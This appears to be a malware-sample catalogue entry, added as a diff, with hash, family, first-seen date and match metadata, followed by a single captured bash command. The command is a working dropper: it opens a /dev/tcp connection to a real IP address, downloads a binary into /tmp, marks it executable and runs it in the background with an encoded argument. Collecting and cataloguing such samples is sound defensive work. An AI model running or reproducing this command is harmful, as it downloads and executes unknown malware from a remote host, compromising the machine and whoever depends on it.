@@ -1,0 +1,10 @@
+# sha256: 9018ebaf070cb3da5b4fc1c08033bcb5912044a91827b0372ec6f1fc9b779cd3
+# family: script_generic
+# kind: script
+# size_bytes: 275
+# first_seen: 2026-05-04 16:34:51.188107 UTC
+# times_seen: 1
+# yara_matches: none
+# ------------------------------------------------------------
+
+nohup bash -c "exec 6<>/dev/tcp/47.242.69.17/60103 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/CPEc0nIawz && chmod +x /tmp/CPEc0nIawz && /tmp/CPEc0nIawz X4n6cYLdsiStWjRlejpWtSa3359m/5svMJr+aJ3WtDi3WDd9ezxdtTay2IJ0+pswKJDgd5vVsCayXD5xe3pSBHMG6OWDRAtASe9m/oCcqBS00m+nvw==" &
